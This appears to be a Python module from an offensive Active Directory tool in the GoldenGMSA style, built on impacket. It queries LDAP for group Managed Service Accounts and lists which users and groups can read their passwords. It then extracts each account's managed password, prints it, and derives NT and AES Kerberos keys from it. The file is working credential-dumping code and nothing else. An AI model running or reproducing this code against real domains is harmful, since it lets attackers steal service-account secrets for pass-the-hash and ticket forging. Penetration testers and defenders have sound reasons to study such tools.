
from impacket.ldap.ldaptypes import SR_SECURITY_DESCRIPTOR
from impacket.krb5.crypto import string_to_key
from impacket.krb5 import constants

import hashlib
import base64
import ldap3

from GoldenGMSA.core.Logger import Logger
from GoldenGMSA.network.LDAP import LDAP
from GoldenGMSA.structures import MSDS_MANAGEDPASSWORD_BLOB, MSDS_MANAGEDPASSWORDID_BLOB

class gMSAInfo:

    def __init__(self, ldap: LDAP, logger: Logger, sid: str) -> None:
        self.ldap = ldap
        self.logger = logger

        self.gMSAaccount = self.ldap.getAllGMSAAccount(sid)

    def computeHash(self, data: bytes, domain: str, samAccountName: str) -> None:
        blob = MSDS_MANAGEDPASSWORD_BLOB()
        blob.fromString(data)
        currentPassword: bytes = blob['CurrentPassword'][:-2]

        # NT
        nt = hashlib.new("md4", currentPassword).hexdigest()
        self.logger.vuln(f"{samAccountName}:::{nt}")

        # AES
        password = currentPassword.decode("utf-16-le", "replace").encode()
        salt = f"{domain.upper()}host{samAccountName[:-1].lower()}.{domain.lower()}"

        aes_256_hash: bytes = string_to_key(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value, password, salt).contents
        self.logger.vuln(f"{samAccountName}:aes256-cts-hmac-sha1-96:{aes_256_hash.hex()}")
        
        aes_128_hash: bytes = string_to_key(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value, password, salt).contents
        self.logger.vuln(f"{samAccountName}:aes128-cts-hmac-sha1-96:{aes_128_hash.hex()}")

    def getMsDsManagedPasswordIDBlob(self, managedPasswordID: bytes) -> MSDS_MANAGEDPASSWORDID_BLOB:
        return MSDS_MANAGEDPASSWORDID_BLOB(managedPasswordID)

    def run(self) -> None:
        if not len(self.gMSAaccount):
            self.logger.error("No entries found!")
            return
        
        for gMSA in self.gMSAaccount:

            self.logger.information(f"sAMAccountName: {gMSA.sAMAccountName}")
            self.logger.information(f"ObjectSID: {gMSA.objectSid}")

            blob = self.getMsDsManagedPasswordIDBlob(gMSA.msDSManagedPasswordId)
            self.logger.information(f"RootKeyGuid: {blob['RootKeyIdentifier']}")

            if len(gMSA.msDSGroupMSAMembership):
                self.logger.information("Groups/Users who can read password:")

                for member in SR_SECURITY_DESCRIPTOR(data=gMSA.msDSGroupMSAMembership)["Dacl"]["Data"]:
                    member_sid = member["Ace"]["Sid"].formatCanonical()
                    entries = self.ldap.search(self.ldap.defaultNamingContext, f"(objectSid={member_sid})", ldap3.SUBTREE, attributes=["sAMAccountName"])

                    if len(entries):
                        self.logger.information(f"\t{entries[0]['raw_attributes']['sAMAccountName'][0].decode()} ({member_sid})")
                    else:
                        self.logger.information(f"\t{member_sid}")

            if len(gMSA.msDSManagedPassword):
                managedPassword = base64.b64encode(gMSA.msDSManagedPassword[0]).decode()
                self.logger.vuln(f"ManagedPassword: {managedPassword}")
                self.computeHash(gMSA.msDSManagedPassword[0], self.ldap.credentials.domain, gMSA.sAMAccountName)
